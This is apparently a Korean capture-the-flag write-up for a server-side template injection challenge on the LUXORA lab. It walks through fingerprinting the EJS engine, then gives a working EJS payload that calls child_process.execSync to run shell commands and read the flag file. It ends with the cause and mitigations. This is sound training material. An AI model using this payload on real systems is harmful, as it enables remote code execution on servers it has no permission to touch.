+++
title = "VulnABLE CTF [LUXORA]: SSTI 🥉 Bronze (Basic Template Injection)"
description = "LUXORA 플랫폼의 Server-Side Template Injection(SSTI) 취약점 발생 원리 및 기초 플래그 획득 시나리오"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SSTI", "Bronze", "Template Engine"]
+++

# VulnABLE CTF [LUXORA]: SSTI 🥉 Bronze

현대 웹 애플리케이션은 동적인 HTML 화면을 생성하기 위해 템플릿 엔진(Template Engine)을 주로 사용합니다. (Node.js의 EJS, Pug, 파이썬의 Jinja2, 파이썬/루비의 Twig 등) 

하지만 사용자의 입력값을 템플릿 엔진의 렌더링 컨텍스트에 그대로(Raw) 집어넣으면, 템플릿 엔진이 이 입력값을 일반 텍스트가 아닌 '실행해야 할 코드'로 인식하는 **Server-Side Template Injection (SSTI)** 취약점이 발생합니다. 이번 `/ssti/bronze` 라우트에서 그 원리를 파헤쳐 보겠습니다.

---

## 🕒 1. 타겟 탐색 및 반응 분석 (Reconnaissance)

`/ssti/bronze` 페이지는 사용자 이름을 입력하면 환영 인사를 출력해 주는 매우 단순한 기능입니다.

* `GET /ssti/bronze?name=Alice` ➔ 화면 출력: `Hello, Alice!`

**[해커의 사고 과정]**
* 내 입력값(`Alice`)이 화면에 그대로 반사(Reflect)되어 출력되고 있다.
* 이것이 단순한 XSS(Cross-Site Scripting)인지, 아니면 서버 단에서 동작하는 SSTI인지 구별해야 한다.
* 대부분의 템플릿 엔진은 수학 연산을 지원한다. 템플릿 문법인 `{{}}` 나 `${}`를 넣어보자!

---

## 🕒 2. 취약점 식별 및 엔진 핑거프린팅 (Exploitation)

템플릿 엔진마다 고유한 문법이 있으므로, 먼저 어떤 엔진을 쓰고 있는지 찾아내는 핑거프린팅(Fingerprinting)을 수행합니다.

### 💡 엔진 판별 연산 삽입
다양한 괄호 문법에 수식을 넣어 서버의 반응을 봅니다.

* 페이로드 1: `GET /ssti/bronze?name={{7*7}}` ➔ 화면 출력: `Hello, {{7*7}}!` (문자 그대로 나옴)
* 페이로드 2: `GET /ssti/bronze?name=${7*7}` ➔ 화면 출력: `Hello, ${7*7}!`
* 페이로드 3: `GET /ssti/bronze?name=<%= 7*7 %>` ➔ 화면 출력: `Hello, 49!`

**빙고!** 수식 `7*7`이 연산되어 `49`로 출력되었습니다. `<%= %>` 문법을 사용하는 것을 보니, Node.js의 대표적인 템플릿 엔진인 **EJS (Embedded JavaScript templating)**를 사용하고 있음이 확실해졌습니다.

---

## 🕒 3. RCE (원격 코드 실행) 수행

템플릿 엔진은 보통 서버의 프로그래밍 언어 환경(여기서는 Node.js/JavaScript)과 바로 맞닿아 있습니다. 즉, 템플릿 문법 안에서 자바스크립트 내장 객체들을 호출할 수 있습니다.

### 🚀 시스템 명령어 실행 페이로드 작성
Node.js에서 OS 명령어를 실행하려면 `child_process` 모듈이 필요합니다. EJS 문법 안에서 `global.process`를 통해 모듈을 불러오겠습니다.

```javascript
// EJS 내부에서 명령어 실행을 위한 페이로드
<%= global.process.mainModule.require('child_process').execSync('ls -la').toString() %>
```

이 페이로드를 URL에 태워 보냅니다. (특수문자가 많으므로 URL 인코딩 필수)

```http
GET /ssti/bronze?name=<%25%3D%20global.process.mainModule.require('child_process').execSync('ls%20-la').toString()%20%25>
```

### 🔍 공격 결과
서버는 이 페이로드를 EJS 코드로 해석하여 백엔드의 리눅스 쉘에서 `ls -la`를 실행하고, 그 결과물을 HTML 화면에 그대로 렌더링해 줍니다.

```text
Hello, 
total 32
drwxr-xr-x 1 root root 4096 Oct 10 12:00 .
drwxr-xr-x 1 root root 4096 Oct 10 11:50 ..
-rw-r--r-- 1 root root   34 Oct 10 12:00 flag_ssti_bronze.txt
...
```

파일 목록에서 플래그 파일(`flag_ssti_bronze.txt`)을 발견했습니다! 명령어를 `cat flag_ssti_bronze.txt`로 바꿔서 다시 전송합니다.

```text
Hello, FLAG{SSTI_🥉_EJS_BASIC_F7A1C2}!
```

---

## 🕒 4. 플래그 획득 및 원리 요약 🚩

**플래그 획득:** `FLAG{SSTI_🥉_EJS_BASIC_F7A1C2}`

### 📝 왜 이런 공격이 성공했는가?
개발자가 EJS의 `ejs.render(template_string, data)` 함수를 사용할 때, 사용자의 입력값(`name`)을 `data` 파라미터로 안전하게 넘기지 않고, **`template_string` 원본 코드 자체에 문자열 결합(+ 기호)으로 집어넣었기 때문**입니다. 이로 인해 입력값이 "데이터"가 아닌 "실행될 템플릿 소스코드의 일부"로 컴파일되어 버렸습니다.

### 🛡️ 방어 대책 (Mitigation)
1. **렌더링 컨텍스트 분리**: 템플릿 문자열 안에 사용자 입력을 직접 결합하지 마세요. 반드시 프레임워크가 제공하는 데이터 바인딩 객체를 통해서만 값을 전달해야 합니다.
   * ❌ 취약: `ejs.render("Hello " + req.query.name)`
   * ✅ 안전: `ejs.render("Hello <%= name %>", { name: req.query.name })`
2. **Logic-less 템플릿 사용 고려**: Mustache나 Handlebars 처럼 템플릿 엔진 내부에서 복잡한 로직(객체 생성, 함수 호출)을 아예 실행할 수 없도록 제한된(Logic-less) 엔진을 사용하는 것도 좋은 방어책입니다.

다음은 특수 문자(특히 괄호)가 철저히 막힌 환경에서 진행하는 **SSTI Silver 🥈 난이도**를 다루겠습니다!